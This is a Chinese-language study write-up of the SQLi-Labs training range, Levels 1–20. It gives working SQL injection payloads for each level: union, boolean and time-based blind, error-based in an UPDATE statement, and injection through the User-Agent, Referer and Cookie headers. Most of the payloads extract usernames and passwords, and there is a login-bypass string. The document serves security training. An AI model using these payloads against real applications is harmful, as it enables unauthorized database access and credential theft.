# SQLi-Labs 靶场实战笔记

## 一、SQL 注入的基本原理

SQL 注入（SQL Injection）是指应用程序将用户输入直接拼接到 SQL 语句中，使输入的数据被数据库当作 SQL 代码执行。

例如，后端原本希望执行：

```sql
SELECT * FROM users WHERE id = 1;
```

如果没有正确处理用户输入，攻击者可能改变查询条件：

```sql
SELECT * FROM users WHERE id = 1 OR 1=1;
```

因为 `1=1` 恒为真，原本针对单个用户的查询可能变成查询多条记录。

SQL 注入的根本原因是：**用户输入的数据与 SQL 程序代码之间缺少安全隔离。**

## 二、实验环境

本次实验使用小皮面板搭建本地 PHP、Apache 和 MySQL 环境。

主要环境：

| 组件       | 版本          |
| ---------- | ------------- |
| Web 服务器 | Apache 2.4.39 |
| 数据库     | MySQL 5.7.26  |
| 靶场       | SQLi-Labs     |
| 操作系统   | Windows       |

## 三、Less-1：单引号字符型注入

### 3.1（有回显的联合注入）

使用

```id=1'
?id=1 '
```



接下来依次报表，爆字段，爆密码

```
? id=-1‘ union select 1，database(),version() --+
```



![database,version](C:\Users\A\Desktop\sql\database,version.png)

```
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```



![字段](C:\Users\A\Desktop\sql\字段.png)

```
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users' --+
```

查users表中的字段

![password](C:\Users\A\Desktop\sql\password.png)

```
? id=-1' union select 1,group_concat(username,0x7e,password),3 from users --+
```

 查询靶场用户数据

##### 其中0x7e是十六进制表示，可以把用户名和密码拼接在一起。

![全部密码](C:\Users\A\Desktop\sql\全部密码.png)

### 3.2 数字型

使用：

```
? id=1
```

同上：

![2.测试](C:\Users\A\Desktop\sql\2.测试.png)

![2.爆库](C:\Users\A\Desktop\sql\2.爆库.png)![2.显示位2，3](C:\Users\A\Desktop\sql\2.显示位2，3.png)

![2.字段](C:\Users\A\Desktop\sql\2.字段.png)

![2.密码](C:\Users\A\Desktop\sql\2.密码.png)

### 3.3 单引号+括号

使用：

```
? id=1 ')
```

步骤同上

### 3.4 双引号+括号

使用：

```sql
? id=1")
```

![4.2](C:\Users\A\Desktop\sql\4.3.png)

![4.3](C:\Users\A\Desktop\sql\4.3.png)

![4.4](C:\Users\A\Desktop\sql\4.4.png)



### 3.5 盲注

Less-5 与前面的关卡不同。

页面不会直接显示正常查询的数据，而是显示类似：

```
You are in...
```

###### 布尔盲注的内容

1. 猜数据库名长度

```
select length( database())=? --+
```

如果页面显示 You are in...，就说明条件为真。

2. 逐字符猜数据库名

```
select substr(database(),1,1)
```

意思是：从数据库名的第 1 个字符开始，取 1 个字符。

而 `ascii()` 可以把字符转换为对应的 ASCII 数值。

```
select ascii(substr(database(),1,1))=? --+
```

猜第二个字符

```
select ascii(substr(database(),2,1))=? --+
```

3. 猜表名

```
（select table_name from information_schema.tables where table_schema=‘database()' limit 0,1 )='a' --+
```

- limit 0,1 :取排序后的第一条记录。
- ‘a’: 开始猜第一个表名为a

4. 猜字段名

```
SELECT column_name
FROM information_schema.columns
WHERE table_schema=DATABASE()
AND table_name='users'
ORDER BY ordinal_position
LIMIT 0,1;
```

##### 时间盲注

```
SELECT IF(
  LENGTH(DATABASE())=8,
  SLEEP(3),
  0
);
```

意思是：

- 数据库名长度等于 8：等待约 3 秒。

- 不等于 8：不主动等待。

  

### - 本关所用布尔型盲注

![11](./11.png)

![5](./5.png)

依次猜出security



### 3.6双引号布尔盲注

同Less-5，但闭合符改为双引号：`?id=1" and 1=1--+`

### 3.8时间盲注

测试延迟：`?id=1' and sleep(5)--+`

在逐字符猜解：

```
?id=1' and if(substr(database(),1,1)='s',sleep(5),0)--+
```



![8.3](C:\Users\A\Desktop\sql\8.3.png)

![8.2](C:\Users\A\Desktop\sql\8.2.png)

![8.5](C:\Users\A\Desktop\sql\8.5.png)

接下来依次慢慢的试

### 3.9单引号时间盲注

同Less-8，但是这一关的界面不论是否输对，没有任何显示。

### 3.10双引号时间盲注

同Less-9

### 3.11POST单引号注入

进入 Less-11，会看到用户名和密码输入框。



![11.](C:\Users\A\Desktop\sql\11..png)

输入万能密码：admin ’– -/123

![11.12](C:\Users\A\Desktop\sql\11.12.png)

然后我们开始爆数据
```
test' union select 1,2-- -
```



```
test' union select 1,database() -- -
```

![11.3](C:\Users\A\Desktop\sql\11.3.png)

```
test' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' -- 
```

![11.6](C:\Users\A\Desktop\sql\11.6.png)

```
test' union select 1,group_concat(column_name) from information_schema.columns where table_schema='security'  and table_name='users'-- 
```



```
test' union select 1,group_concat(username,0x7e,password) from users -- -
```

![11.9](C:\Users\A\Desktop\sql\11.9.png)

### 3.12双引号+括号POST注入

同pass 11；

### 3.13单引号+括号POST注入

同pass 11；

### 3.14双引号报错注入

同pass11，但是页面没有回显



### 3.15Less-15 单引号 POST 盲注

用户名框填写 payload，密码填写普通测试值。使用存在的用户名，例如 admin，对照下面两次响应。

```sql
admin' AND 1=1 -- -
admin' AND 1=2 -- -
```

只有基准请求有效、真假条件表现可区分时，才能继续依靠登录页面判断。下面依次检查库名、表名、字段、用户名和密码。

```
admin' AND LENGTH(DATABASE())>0 -- -
admin' AND ASCII(SUBSTRING(DATABASE(),1,1))>100 -- -
```

![6](C:\Users\A\Desktop\6.png)

```
admin' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 0,1))>0 -- -
admin' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 0,1),1,1))>100 -- -
```



![7](C:\Users\A\Desktop\7.png)



```sql
admin' AND LENGTH((SELECT username FROM users ORDER BY id LIMIT 0,1))>0 -- -
admin' AND ASCII(SUBSTRING((SELECT username FROM users ORDER BY id LIMIT 0,1),1,1))>100 -- -
```

![8](C:\Users\A\Desktop\8.png)

```sql
admin' AND LENGTH((SELECT password FROM users ORDER BY id LIMIT 0,1))>0 -- -
admin' AND ASCII(SUBSTRING((SELECT password FROM users ORDER BY id LIMIT 0,1),1,1))>100 -- -
```

![9](C:\Users\A\Desktop\9.png)

![10](C:\Users\A\Desktop\10.png)

### 3.16 双引号与括号 POST 盲注

在用户名框闭合双引号和右括号。其他逐字符操作与 Less-15 相同。

```sql
admin") AND 1=1 -- -
admin") AND 1=2 -- -
```
```sql
admin") AND ASCII(SUBSTRING(DATABASE(),1,1))>100 -- -
```

```sql
admin") AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 0,1),1,1))>100 -- -
```

```sql
admin") AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' ORDER BY ordinal_position LIMIT 0,1),1,1))>100 -- -
```

```sql
admin") AND ASCII(SUBSTRING((SELECT username FROM users ORDER BY id LIMIT 0,1),1,1))>100 -- -
```

```sql
admin") AND ASCII(SUBSTRING((SELECT password FROM users ORDER BY id LIMIT 0,1),1,1))>100 -- -
```

## 七、Less-17 密码更新的报错注入

用户名填有效的 admin，注入位置为新密码字段 passwd。标准版本对用户名进行处理，需要在密码更新语句中触发错误。本关会执行 UPDATE，先记录测试账号的状态。

下面分别查库、查表、查字段、查用户名、查密码。读取 users 时使用带 LIMIT 的派生表，避免直接读取更新目标表的限制。
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) -- -
```

![171](C:\Users\A\Desktop\171.png)

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 0,1),0x7e)) -- -
```

![172](C:\Users\A\Desktop\172.png)

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' ORDER BY ordinal_position LIMIT 0,1),0x7e)) -- -
```

![173](C:\Users\A\Desktop\173.png)

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' ORDER BY ordinal_position LIMIT 0,1),0x7e)) -- -
```

![174](C:\Users\A\Desktop\174.png)

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM (SELECT password FROM users ORDER BY id LIMIT 0,1) AS t),0x7e)) -- -
```

![176](C:\Users\A\Desktop\176.png)

## Less-18 请求头报错注入

先使用有效靶场账号密码提交登录请求

![181](C:\Users\A\Desktop\181.png)

发送到 Burp 。在 User-Agent 请求头中依次使用以下值，每行对应一次独立请求。保留其他请求内容正常。标准版本将请求头写入日志表，使用字符串表达式保持 INSERT 结构。

```http
User-Agent: '+EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))+'
```

![185](C:\Users\A\Desktop\185.png)

```http
User-Agent: '+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 0,1),0x7e))+'
```

![186](C:\Users\A\Desktop\186.png)

```http
User-Agent: '+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' ORDER BY ordinal_position LIMIT 0,1),0x7e))+'
```

![187](C:\Users\A\Desktop\187.png)

```http
User-Agent: '+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT username FROM users ORDER BY id LIMIT 0,1),0x7e))+'
```

![188](C:\Users\A\Desktop\188.png)

```http
User-Agent: '+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users ORDER BY id LIMIT 0,1),0x7e))+'
```

![189](C:\Users\A\Desktop\189.png)

## Less-19 请求头报错注入

同18，先使用有效靶场账号密码提交登录请求，发送到 Burp Repeater。在 Referer 请求头中依次使用以下值，每行对应一次独立请求。保留其他请求内容正常。标准版本将请求头写入日志表，使用字符串表达式保持 INSERT 结构。

```http
Referer: '+EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))+'
```

```http
Referer: '+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 0,1),0x7e))+'
```

```http
Referer: '+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' ORDER BY ordinal_position LIMIT 0,1),0x7e))+'
```

```http
Referer: '+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT username FROM users ORDER BY id LIMIT 0,1),0x7e))+'
```

```http
Referer: '+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users ORDER BY id LIMIT 0,1),0x7e))+'
```

## Less-20 Cookie 注入与联合查询

同18，先正常登录获取 uname Cookie，抓取登录后的请求并发往 Repeater。修改 uname 的值，保留需要的其他 Cookie。

```http
Cookie: uname=admin' AND 1=1 -- -
Cookie: uname=admin' AND 1=2 -- -
```

验证三列及页面显示位置。下面每行单独发送。

```http
Cookie: uname=-1' ORDER BY 3 -- -
Cookie: uname=-1' ORDER BY 4 -- -
Cookie: uname=-1' UNION SELECT 1,2,3 -- -
```

确认页面显示第2、3列后，依次查库、表、字段、用户名和密码。

```http
Cookie: uname=-1' UNION SELECT 1,DATABASE(),VERSION() -- -
Cookie: uname=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=DATABASE() -- -
Cookie: uname=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' -- -
Cookie: uname=-1' UNION SELECT 1,username,password FROM users -- -
```

